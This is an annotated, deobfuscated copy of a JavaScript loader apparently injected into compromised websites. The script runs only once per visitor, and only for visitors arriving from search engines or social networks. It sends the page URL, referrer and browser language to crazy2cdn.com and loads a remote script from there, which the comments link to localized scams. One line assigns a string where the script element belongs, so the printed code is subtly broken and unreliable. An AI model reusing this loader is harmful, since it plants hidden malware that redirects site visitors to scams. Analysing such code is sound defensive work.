// url: https://crazy2cdn.com/min.t.1714640400.js?v=66335d18

!(function (p_document, injectedScript) {
	const se = "se"
	docCookies = document.cookie
	document.cookie = se + "=1;path=/"
	// se=1;path=/
	const rootDomain = document.referrer && document.referrer.split("/").length > 2 ? document.referrer.split("/")[2] : document.referrer
	// rootDomain -> https://google.com/ -> google.com
	if (!rootDomain || -1 != docCookies.indexOf(se)) return
	// return if rootDomain is invalid or cookies has "se"

	/* ["google.","bing.","facebook.","yahoo","instagram","pinterest","naver"]
    check if root referrer has the urls above
    */
	if (
		-1 == rootDomain.indexOf("google.") &&
		-1 == rootDomain.indexOf("bing.") &&
		-1 == rootDomain.indexOf("facebook.") &&
		-1 == rootDomain.indexOf("yahoo") &&
		-1 == rootDomain.indexOf("instagram") &&
		-1 == rootDomain.indexOf("naver") &&
		-1 == rootDomain.indexOf("pinterest")
	)
		return

	const crazy2cdnurl = "crazy2cdn.com" // ->Y3JhenkyY2RuLmNvbQ== -> crazy2cdn.com
	injectedScript = p_document.createElement("script").type = "text/javascript"
	injectedScript.async = true
	let payload_object = []
	payload_object.rr = "sq4ct8g5"
	payload_object.u = window.location.href
	payload_object.r = document.referrer
	payload_object.l = window.navigator.language
	// i.l -> localized scams

	// prepare url
	injectedScript.src =
		"https://crazy2cdn.com/js/script.js?" +
		btoa(
			(function (e) {
				// e = payload_object
				//  prepare urlSearchParams
				const t = []
				for (let n in e) t.push(encodeURIComponent(n) + "=" + encodeURIComponent(e[n]))
				return t.join("&")
			})(payload_object)
		)
		
	// example url below:
	// https://crazy2cdn.com/js/script.js?rr=sq4ct8g5&u=https%3A%2F%2Fwww.kentkart.com%2Fcozumler%2Fmobil-uygulama%2F&r=https%3A%2F%2Fwww.google.com%2F&l=tr-TR

	// inject to root
	p_document.getElementsByTagName("head")[0].appendChild(injectedScript)
})(document)
